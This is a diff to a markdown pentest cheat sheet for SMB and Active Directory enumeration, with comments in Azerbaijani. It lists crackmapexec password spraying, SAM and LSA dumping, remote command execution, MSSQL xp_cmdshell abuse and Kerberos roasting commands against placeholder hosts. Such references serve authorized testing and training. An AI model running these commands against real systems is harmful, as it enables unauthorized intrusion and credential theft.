@@ -19,6 +19,12 @@ nmap -p445 --script smb-enum-shares,smb-enum-users,smb-security-mode,smb-os-disc
 # Targeted share enum + vuln check
 nmap -p445 --script smb-vuln*,smb-enum* $IP
 
+# SMB protocol & signing check (əlavə edilməli kritik hissə)
+nmap -p445 --script smb-protocols,smb2-security-mode $IP
+
+# Time drift (Kerberos üçün vacibdir)
+nmap -p445 --script smb2-time $IP
+
 # Multiple targets + output
 nmap -iL targets.txt -p445 --script smb* -oA smb_enum
 ```
@@ -71,7 +77,7 @@ crackmapexec smb 10.10.10.0/24
 crackmapexec smb 10.10.10.10 -u user -p password
 
 # Multiple Target 
-crackmapexec smb targets.txt -u user -p password ( Multiple Target )
+crackmapexec smb targets.txt -u user -p password
 
 # Spraying
 crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
@@ -88,6 +94,12 @@ crackmapexec smb 10.10.10.10 -u administrator -p password --local-auth
 # Check Shares
 crackmapexec smb 10.10.10.10 -u user -p password --shares
 
+# Logged-on users (əlavə edilməli)
+crackmapexec smb 10.10.10.10 -u user -p password --loggedon-users
+
+# Active sessions (lateral movement üçün vacib)
+crackmapexec smb 10.10.10.10 -u user -p password --sessions
+
 # Dump Technique
 crackmapexec smb 10.10.10.10 -u user -p password --users
 crackmapexec smb 10.10.10.10 -u administrator -p password --sam
@@ -95,6 +107,7 @@ crackmapexec smb 10.10.10.10 -u administrator -p password --lsa
 
 # Command Execution
 crackmapexec smb 10.10.10.10 -u administrator -p password -x "whoami"
+
 ```
 
 # 4. Smbmap
@@ -113,7 +126,7 @@ smbmap -H 10.10.10.10 -u user -p password -r
 smbmap -H 10.10.10.10 -u user -p password -r SHARENAME
 
 # Directory Depth List
-smbmap -H 10.10.10.10 -u user -p password -r SHARE --depth 2 ( 3 big domain )
+smbmap -H 10.10.10.10 -u user -p password -r SHARE --depth 2
 
 # File Download
 smbmap -H 10.10.10.10 -u user -p password --download SHARE/file.txt
@@ -150,6 +163,10 @@ smbclient.py user:password@10.10.10.10
 smbclient.py -no-pass 10.10.10.10
 shares
 
+# MSSQL abuse
+impacket-mssqlclient domain/user:pass@target
+EXEC xp_cmdshell
+
 # Kerberos Recon
 GetADUsers.py domain/user:password -dc-ip 10.10.10.10
 
@@ -157,7 +174,7 @@ GetADUsers.py domain/user:password -dc-ip 10.10.10.10
 GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.10.10.10
 
 # SPN Enumeration
-GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10
+GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request
 
 # Password Policy Enumeration
 GetADUsers.py domain/user:password -dc-ip 10.10.10.10 -all
